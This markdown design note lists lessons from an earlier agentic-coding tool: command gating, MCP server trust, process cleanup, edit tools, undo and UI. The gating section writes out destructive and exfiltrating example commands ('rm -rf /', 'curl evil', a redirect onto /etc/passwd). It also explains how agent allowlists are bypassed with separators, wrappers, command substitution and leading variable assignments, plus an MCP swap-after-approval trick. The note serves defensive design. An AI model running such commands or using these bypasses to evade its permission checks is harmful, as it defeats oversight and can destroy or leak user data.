# Lessons from prior art

Durable technical lessons extracted from a previous agentic-coding tool
the user built ("SafranCode", docs read 2026-09-01). Kept here so future
sessions get the value without re-reading ~200 KB of source docs, and
without inheriting that document set's framing — it was AI-written and
overstated things, so only mechanisms verified against its technical
detail are recorded below.

**These are lessons, not a design to copy.** This project is a
from-scratch rebuild with a different architecture (a standalone
Electron app, not a VS Code extension). Anything shaped by that project's host constraints
was deliberately left out.

## Permission / command gating

- **Prefix allowlists on shell commands are trivially bypassed** unless
  the command is parsed into independently-executed segments first.
  An allowlist matching `^git` against a raw string approves
  `git status; rm -rf /`. Split on every real separator — including a
  single pipe, since `npm test | curl evil` genuinely runs `curl`.
- **A dangerous command can hide one level down.** Command
  substitution `$(…)`, `find -exec`, and indirection wrappers
  (`bash -c`, `env`, `xargs`, `timeout`, `nice`) all conceal a real
  command from an anchored pattern match. Whether to unwrap these
  recursively is a defense-in-depth decision, but know the hole exists.
- **Leading `VAR=val` assignments shift the real command** off the start
  of the string, defeating `^`-anchored patterns entirely. This was a
  live bypass of an entire block list, found by accident.
- **Refuse what you can't prove.** Globs, variables, and computed
  redirection targets can't be resolved without predicting shell
  expansion. Treat unprovable as dangerous, never as probably-fine.
- **Redirections are writes.** `rm -rf build > /etc/passwd` truncates a
  system file, and the target is not an operand — an operand-only check
  never sees it.
- **Order is the security contract.** An un-overridable block tier must
  be evaluated *before* any user-saved "always allow" rule, or a saved
  allow short-circuits it. This ordering deserves its own explicit test.

## MCP

- **Bind trust to a fingerprint of the server's actual command, args,
  and URL — not its name.** Otherwise a project can get a benign server
  approved and then swap in a different command; hashing the definition
  means any edit silently revokes trust and forces re-approval.
- **A server defined inside an opened project is untrusted by default.**
  Opening someone's repo must never execute their code.
- **Filter a server's tools at registration, not at call time**, if the
  intent is that the model never sees them at all. Keep a call-time
  gate as well — the two checks answer different questions.
- **Piped, not inherited, stderr** for spawned servers, so a failing
  server's real diagnostic is capturable and showable in the UI instead
  of surfacing as a bare "connection closed."

## Process hygiene (learned expensively)

A field-test session ended with ~60 orphaned browser processes and ~50
stranded temp profiles. There were four independent causes, all worth
knowing:

1. A graceful `close()` is a *protocol request* — a hung renderer or a
   lost connection leaves the tree alive while `close()` resolves.
2. The transport-level close of an MCP stdio server kills only the
   immediate process, stranding whatever it launched.
3. A crashed browser left a live-looking handle: state said "open," the
   endpoint kept being published, and every subsequent call went
   nowhere. **Crashes must be detected and the capability withdrawn**,
   so failure degrades to a fallback instead of silently breaking
   everything downstream.
4. A force-killed parent runs no cleanup at all, so orphans accumulate
   across sessions. Anything spawned needs to be reclaimable by a
   *later* run, not only by an orderly shutdown of the current one.

The structural answer for all four is OS-level process grouping (Job
Objects / cgroups) plus crash detection — see `stack.md`.

## Tools

- **An edit that cannot change the file must be reported as a failure.**
  Rewriting a file with identical bytes and reporting success tells the
  model it made a change it didn't make, and it proceeds on a false
  premise. Check "would this be a no-op" *before* searching, so the
  diagnosis doesn't depend on file contents.
- **Match tolerantly, but never guess.** Accepting a near-match is fine
  only when exactly one span qualifies; more than one must be an error
  telling the caller to disambiguate.
- **Multi-file edits are atomic per file.** Apply in memory; the first
  failure discards the chain rather than leaving a half-edited file.
- **Tools return typed results, never rendered strings or sentinels**,
  and contain no permission logic of their own.

## Skills

- **Only name + description belong in the always-loaded prompt**; bodies
  load on demand. The cost of the list is what makes a large library
  affordable.
- **Name-collision precedence across sources must be explicit**, not an
  accident of scan order.

## Session / undo

- **The model's context and the human's transcript must be allowed to
  diverge.** Compaction shrinks what the model sees; if the UI and the
  resume list read from that same shrunken view, a real conversation
  becomes unlabelable and disappears from the picker. Keep a durable
  display record plus a write-once title source.
- **Drive undo from what was actually recorded as written**, never from
  a reconstruction like counting user messages — the reconstruction
  drifts and undo silently restores nothing.
- **Undo must be idempotent and drift-aware**: skip files already
  matching the target, and detect files changed outside the agent since
  the turn before overwriting them.
- **Only track what's inside the workspace.** Out-of-scope writes must
  be skipped rather than restored or errored on.

## UI

- **Keep rendering logic as pure `(data) → descriptor` functions**, with
  components as a thin last layer. This is what makes UI logic testable
  without a DOM.
- **The view must be able to rehydrate from host state.** Any UI-local
  state not derivable from the stream has to be re-sent on reconnect,
  or a reopened panel comes back blank and unrecoverable.
- **A completed action's verb is a claim about what happened.** Don't
  say "wrote" when the write failed.
- **Assume the widest possible token.** Model output contains long
  unbroken strings (paths, URLs, base64); a container without
  `min-w-0` + `overflow-auto` silently widens and pushes content off
  the panel — which happened on an *approval* surface, where the user
  couldn't read what they were approving.
